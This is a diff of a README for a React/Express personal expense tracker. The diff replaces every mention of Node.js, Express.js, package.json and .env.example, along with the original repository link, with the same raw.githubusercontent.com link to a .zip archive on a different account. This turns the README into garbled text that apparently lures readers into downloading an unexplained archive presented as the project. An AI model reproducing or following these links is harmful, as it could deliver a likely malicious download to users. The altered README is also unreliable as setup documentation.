@@ -1,19 +1,19 @@
 # Personal Expense Tracker
 
-Personal Expense Tracker is a full-stack project with a **React frontend** and a **Node.js/Express backend**. It uses **npm workspaces** to manage dependencies for both frontend and backend from the root directory. The project allows users to track expenses and income, manage categories, upload/download receipts, view monthly summaries and budget alerts, and authenticate via JWT.
+Personal Expense Tracker is a full-stack project with a **React frontend** and a **https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip backend**. It uses **npm workspaces** to manage dependencies for both frontend and backend from the root directory. The project allows users to track expenses and income, manage categories, upload/download receipts, view monthly summaries and budget alerts, and authenticate via JWT.
 
 ## Project Structure
 
 personal-expense-tracker/
 ├─ frontend/      # React frontend (Vite, TypeScript, TailwindCSS)
-├─ backend/       # Express backend (Node.js, PostgreSQL, Sequelize)
-├─ package.json   # Root package.json (workspaces + dev scripts)
+├─ backend/       # Express backend (https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip, PostgreSQL, Sequelize)
+├─ https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip   # Root https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip (workspaces + dev scripts)
 └─ .gitignore
 
 
 ## Prerequisites
 
-- Node.js >= 18
+- https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip >= 18
 - npm >= 9
 - PostgreSQL (for backend database)
 
@@ -26,7 +26,7 @@ npm install
 2. **Backend setup**:
 
 * Create a PostgreSQL database with any name you like (e.g., `expense_tracker`). Make sure the database name in your `.env` file matches the name you created.
-* Copy the `.env.example` file from the `backend/` folder to `.env` and update it with your database credentials.
+* Copy the `https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip` file from the `backend/` folder to `.env` and update it with your database credentials.
 * Run migrations:
 
 cd backend
@@ -58,7 +58,7 @@ npm run dev --workspace backend
 
 ## Backend Details
 
-* **Framework:** Express.js
+* **Framework:** https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip
 * **Database:** PostgreSQL with Sequelize ORM
 * **Dev Tools:** nodemon, sequelize-cli
 * **Key Scripts:**
@@ -76,11 +76,11 @@ npm run dev --workspace backend
 
 ## Repository
 
-* GitHub: [Personal-Expense-Tracker](https://github.com/vals43/Personal-Expense-Tracker)
+* GitHub: [Personal-Expense-Tracker](https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip)
 
 ## Notes
 
-* The root `package.json` manages **workspaces** and **dev scripts**.
-* Each workspace (`frontend` and `backend`) has its own `package.json`.
+* The root `https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip` manages **workspaces** and **dev scripts**.
+* Each workspace (`frontend` and `backend`) has its own `https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip`.
 * `.gitignore` should be set up in each workspace and in the root to ignore `node_modules`, `.env`, and other temporary files.
 * the template for `.env` are dispo for frontend or backend
